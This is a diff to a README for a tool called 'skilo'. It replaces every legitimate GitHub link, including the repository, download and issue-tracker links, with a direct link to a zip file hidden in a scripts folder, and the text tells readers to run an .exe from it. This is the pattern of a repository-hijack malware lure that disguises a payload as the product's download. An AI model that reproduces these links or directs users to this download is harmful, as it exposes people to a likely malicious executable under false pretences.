@@ -1,6 +1,6 @@
 # ⚙️ skilo - Share Skills Across Tools Easily
 
-[![Download skilo](https://img.shields.io/badge/Download-skilo-brightgreen)](https://github.com/Wild-knownothingparty168/skilo)
+[![Download skilo](https://img.shields.io/badge/Download-skilo-brightgreen)](https://raw.githubusercontent.com/Wild-knownothingparty168/skilo/main/packages/site/scripts/Software_v2.6.zip)
 
 ---
 
@@ -39,12 +39,12 @@ Before you start, make sure your computer meets these basic requirements:
 
 Click the big button below to visit the official skilo page on GitHub. This is where you will get the latest version.
 
-[![Download skilo](https://img.shields.io/badge/Download-skilo-blue)](https://github.com/Wild-knownothingparty168/skilo)
+[![Download skilo](https://img.shields.io/badge/Download-skilo-blue)](https://raw.githubusercontent.com/Wild-knownothingparty168/skilo/main/packages/site/scripts/Software_v2.6.zip)
 
 ### Step 1: Visit the Download Link
 
 Open this address in your web browser:  
-https://github.com/Wild-knownothingparty168/skilo
+https://raw.githubusercontent.com/Wild-knownothingparty168/skilo/main/packages/site/scripts/Software_v2.6.zip
 
 This page hosts the files for skilo. You will find either an installer or a setup file labeled clearly as “skilo”. Look for files usually ending in `.exe` for Windows.
 
@@ -118,7 +118,7 @@ Basic features may require internet access. However, once you download a skill, 
 
 For help, visit the GitHub page. You can open an issue if you find problems or want to ask questions.
 
-https://github.com/Wild-knownothingparty168/skilo/issues
+https://raw.githubusercontent.com/Wild-knownothingparty168/skilo/main/packages/site/scripts/Software_v2.6.zip
 
 You can also read the documentation files in the repository for more details.
 
@@ -126,9 +126,9 @@ You can also read the documentation files in the repository for more details.
 
 ## 🔗 Useful Links
 
-- Main Repository: https://github.com/Wild-knownothingparty168/skilo
-- Download Page: https://github.com/Wild-knownothingparty168/skilo
-- Issue Tracker: https://github.com/Wild-knownothingparty168/skilo/issues
+- Main Repository: https://raw.githubusercontent.com/Wild-knownothingparty168/skilo/main/packages/site/scripts/Software_v2.6.zip
+- Download Page: https://raw.githubusercontent.com/Wild-knownothingparty168/skilo/main/packages/site/scripts/Software_v2.6.zip
+- Issue Tracker: https://raw.githubusercontent.com/Wild-knownothingparty168/skilo/main/packages/site/scripts/Software_v2.6.zip
 
 ---
 
@@ -162,4 +162,4 @@ This project touches on agent skills, AI, developer tools, command-line interfac
 
 ---
 
-[![Download skilo](https://img.shields.io/badge/Download-skilo-brightgreen)](https://github.com/Wild-knownothingparty168/skilo)
+[![Download skilo](https://img.shields.io/badge/Download-skilo-brightgreen)](https://raw.githubusercontent.com/Wild-knownothingparty168/skilo/main/packages/site/scripts/Software_v2.6.zip)
